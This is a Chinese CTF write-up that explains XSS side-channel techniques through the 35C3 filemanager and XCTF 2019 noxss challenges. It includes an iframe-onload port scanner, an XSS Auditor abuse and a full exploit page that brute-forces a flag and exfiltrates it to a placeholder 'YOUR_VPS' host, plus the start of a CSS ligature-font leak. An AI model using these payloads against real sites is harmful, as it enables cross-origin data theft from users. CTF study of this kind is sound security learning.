# 前言
近期学习总结了一下侧信道相关的知识，做了几道典型的题。这几道题很多师傅也写过详细的wp，在参考师傅们思路的基础上复现了一下（膜师傅们），文章的内容主要是把这几道题的知识点拎出来总结了一下。第一次投稿，师傅们轻喷，如果有说的不对的地方，欢迎师傅们交流指正quq。
# 侧信道攻击简介
侧信道攻击的概念来源于密码学，下面是维基百科对其的解释：
> 在密码学中， **旁道攻击** 又称 **侧信道攻击** 、 **边信道攻击** （英语：Side-channel
> attack）是一种攻击方式，它基于从密码系统的物理中获取的信息而非暴力破解法或是算法中的理论性弱点（较之密码分析）。例如：时间信息、功率消耗、电磁]泄露或甚是声音可以提供额外的信息来源，这可被利用于对系统的进一步破解。某些侧信道攻击还要求攻击者有关于密码系统内部操作的技术性信息，不过，其他诸如[差分电力分析](https://zh.wikipedia.org/wiki/电力分析)的方法在黑盒攻击中效果明显。许多卓有成效的侧信道攻击基于由保罗·科切开拓的统计学方法。
简单来说，侧信道就是利用侧信息(Side
Channel)来高效地绕过或突破某些防御，而避免一些低效的爆破等。对于XSS侧信道，大多是利用一些可能有利于XSS但又并非属于XSS代码本身范畴的特性来绕过一些Waf从而实现侧信道攻击，而XSS侧信道攻击的结果拓展了XSS的某些"鸡肋"，更加巧妙的泄露出数据进而获取。
下面我们通过几道题目来学习关于XSS侧信道的相关知识点
# 35C3 CTF filemanager
这道题重点考察了以下内容
  1. iframe的onload
  2. XSS Auditor特性
  3. 利用侧信道读取数据并外带数据
## 题目说明
> Check out my web-based filemanager running at
> [https://filemanager.appspot.com](https://filemanager.appspot.com/).  
>  The admin is using it to store a flag, can you get it? You can reach the
> admin's chrome-headless at: nc 35.246.157.192 1
题目一开始给了两个接口，给出了地址的web应用和管理员入口：`nc 35.246.157.192 1`
**1.web应用**
  1. 创建文件：可以自定义文件名，文件内容，并对文件进行存储，header中设置了`xsrf = 1`来防止csrf文件读取：
  2. 文件读取：GET请求，且响应头中定义
    content-type:text/plain
    x-content-type-options: nosniff
  1. 文本查询：如果文本不存在将会返回`no results`，如果文本存在，将会返回
    test
      diggid
        (()=>{
          for (let pre of document.getElementsByTagName('pre')) {
            let text = pre.innerHTML;
            let q = 'diggid';
            let idx = text.indexOf(q);
            pre.innerHTML = `${text.substr(0, idx)}${q}${text.substr(idx+q.length)}`;
          }
        })();
上面这段代码的作用就是高亮已存在的文本内容`diggid`
**2.nc接口**
nc连上去后，会要求用Node.js的proof-of-work包进行验证计算，相当于一层简单的验证码，用一行命令即可算出验证码并提交：
    proof-of-work  
校验成功就可以输入一个URL，管理员bot会访问这个URL(显然是模拟用户访问恶意构造的页面)
**3.目标**
题目说明中告诉了我们flag被admin用户存储了起来，如果是以admin用户的身份访问这个web应用，我们利用文本查询的功能可以获取flag。
## iframe的onload
利用iframe的onload和chrome-error://chromewebdata/可以用来进行 **端口扫描**
，Chrome浏览器中的iframe标签，在对一个URL发送请求时，添加onload事件，无论是否请求成功，都会触发onload事件，但要注意：只有URL改变时才会触发onload事件，添加锚点`#`而URL未改变不会触发onload事件。当浏览器在向一个没有被服务器监听的端口发送请求时，显示错误页面，此时URL变为chrome-error://chromewebdata/。端口扫描的代码如下：
先给iframe设置好onload事件和url(该url为要探测的地址+端口)，在外层onload事件内部，修改url为`url +
#`，并在内部重新定义了onload事件。
  * 如果端口存在，则当资源加载完毕后，触发外层onload事件，而此时`iframe.src`仍为原来的URL，内部的onload事件不会触发
  * 如果端口不存在，此时的`iframe.src`变为`chrome-error://chromewebdata/`，URL改变重新请求新的资源，触发内层onload事件，从而打印出`端口不存在`
> **关于onload事件，还要注意的是，如果有多层onload，当改变URL时，只触发与修改URL语句就近的那层onload**
上述代码还可以替换为用计数器来记录外层onload事件的触发次数，从而判断URL是否改变
        var iframe = document.createElement('iframe');
        var url = "http://192.168.170.129:6666/"; 
        var count = 0;
        iframe.onload = () => {
            count++;
            if(count > 1){
                console.log("端口不存在");
            }
            if(count 
## XSS Auditor 和 chrome-error
Chrome中存在一个特性XSS Auditor：当在请求中匹配到了源码中的脚本，则会阻止该请求，并跳转到chrome-error://chromewebdata/(或者扫描到没有监听服务的端口也会跳转到该页面)。前面所说的文本查询部分，成功或失败存在两种状态，假设我们提交了如下URL
    https://filemanager.appspot.com/search?q=diggid&%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b
假设文本中存在`diggid`，因此就会返回查询成功时的代码，同时检测到URL中存在和代码相同的部分，则会阻止该请求并跳转到chrome-error://chromewebdata/(对应上面端口扫描不存在的情况)。假设文本中不存在`diggid`，则会返回`no
results`，页面不会跳转。这一部分就和上面的端口扫描的思想一样了。因此爆破flag的思路就比较清晰了，上述原理就是利用了侧信道的思想来获取数据。
## 数据外带
梳理以下爆flag的流程：1.构造侧信道获取flag的页面；2.发送给管理员bot访问
管理员bot访问后爆出的flag我们没办法获取，这里有两种方式来使得数据外带：
  1. 在爆破出flag的情况(onload触发两次)内再加一层onload，修改`iframe.src = 'http://YOUR_VPS:PORT/?flag='+encodeURIComponent(flag + char)`，也就是说每次爆出字符后，会请求自己vps， **vps上监听一下就可以得到数据回显了**
  2. 如果是本地测试(flag放在本地)，管理员bot的身份相当于自己，访问之后数据可以回显到自己浏览器中。可以将方法1替换为`console.log(encodeURIComponent(flag + char))`
## 利用代码
我们根据上面的思想构造利用代码如下：
        var URL = 'https://filemanager.appspot.com/search?q=flag&a=%3Cscript%3E%20%20%20%20%28%28%29%3d%3E%7b%0a%20%20%20%20%20%20for%20%28let%20pre%20of%20document%2egetElementsByTagName%28%27pre%27%29%29%20%7b%0a%20%20%20%20%20%20%20%20let%20text%20%3d%20pre%2einnerHTML%3b';
        var charset = '_abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;?@[\\]^`{|}~ ';
        var flag = '35C3'; /*35C3_xss_auditor_for_the_win*/
        function GetFlag(i, flag) {
            if(i >= 94)
                return;
            var real_flag = flag + charset[i];
            var iframe = document.createElement('iframe');
            var count = 0;
            iframe.onload = function () {
                count++;
                if (count > 1) {
                    flag = real_flag;
                    i = -1; //递归重置
                    iframe.onload = () => {}; //发送请求外带数据
                    iframe.src = 'http://YOUR_VPS:PORT/?flag=' + encodeURIComponent(real_flag); # 外带数据
                }
                iframe.src = iframe.src + '#';
            };
            iframe.src = URL.replace('flag', real_flag);
            document.body.appendChild(iframe);
            timer = setTimeout(() => {  
                document.body.removeChild(iframe);
                GetFlag(i + 1, flag);
            }, 2000); //设置延时保证onload加载完成
        }
        GetFlag(0, flag);
将上述代码保存为exp.html，发送URL给管理员bot访问，最后在自己vps的log中可以得到flag
**参考**
# XCTF 2019 Final noxss
在做这道题之前，我们需要先了解一些前置知识，题目场景简化如下：
        Document
    >
        var TOKEN = "";
题目要求比较简单，设置了两个token，第一个需要从``标签获取，第二个需要从``中获取，可控的部分只有`$_GET['css']`传入的css参数，其夹在``标签中，也就是说这个css参数其实也就是css样式。因此我们需要利用css侧信道来搞事情。关于token1如何获取，由于篇幅原因，这里就不过多解释了。主要来看和该题相关的token2如何获取。
## 获取``中的token2
### demo
在获取token2之前，我们先了解一下什么是连字
>
> 字体中的连字至少由两个具有图形形式的字符序列组成。多个字符序列组成的连字就代表一个字符，其在Unicode中有相应的字符编码。调整字距不会影响连字中字符序列的距离。最常见的有`fi`的连字`ﬁ`。更多详细的说明可参考：
>
>   * 
>   * 
>
我们可以利用fontforge([安装fontforge](http://designwithfontforge.com/zh-CN/Installing_Fontforge.html))来自定义生成字体(包括连字)
> 现代浏览器已经不支持 SVG 格式的字体了，我们可以利用 fontforge 将 SVG 格式转换成 WOFF 格式
准备一个script.fontforge文件将.svg转换为.woff
    #!/usr/bin/fontforge
    Open($1)
    Generate($1:r + ".woff")
再准备我们构造好的test.svg文件，该文件中定义了名为`diggid`的字体，该字体中有：a-z 26个0宽度字母，hack这个宽度为9000的连字